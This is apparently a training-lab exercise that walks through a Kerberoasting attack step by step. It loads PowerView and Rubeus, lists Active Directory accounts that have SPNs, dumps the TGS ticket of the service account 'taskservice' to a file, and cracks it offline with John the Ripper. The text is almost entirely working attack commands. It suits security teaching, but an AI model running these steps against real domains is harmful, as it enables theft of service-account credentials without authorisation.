# Exercise 4 - Kerberos Roasting

## Tools

所需工具:

- PowerView: [https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)
- Rubeus: [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- john: [https://www.openwall.com/john/](https://www.openwall.com/john/)

## Exercise

在此練習中，我們將使用 Kerberoasting攻擊，利用密碼爆破方式取得服務帳號 "taskservice".

載入Powerview和Rubeus兩個powershell模組

```powershell
cd C:\attacker-tools
cat -raw .\PowerView.ps1 | iex
cat -raw .\Invoke-Rubeus.ps1 | iex
```

Get all domain users with a Service Principal Name (SPN).

列舉所有有註冊SPN的domain users

```powershell
Get-DomainUser -SPN | select samaccountname, description, pwdlastset, serviceprincipalname
```

也可使用rubeus取得相關資訊

```powershell
Invoke-Rubeus -Command "kerberoast /stats"
```

使用Rubeus發起TGS請求並將TGS輸出到檔案krb5tgs.txt

```powershell
Invoke-Rubeus -Command "kerberoast /user:taskservice /format:hashcat /outfile:krb5tgs.txt"
```

利用john the ripper離線破解TGS，嘗試取得taskserivice明文密碼

```powershell
cd C:\attacker-tools\john\run
.\john.exe <path-to-krb5tgs.txt> --wordlist=..\..\example.dict --rules=passphrase-rule2
```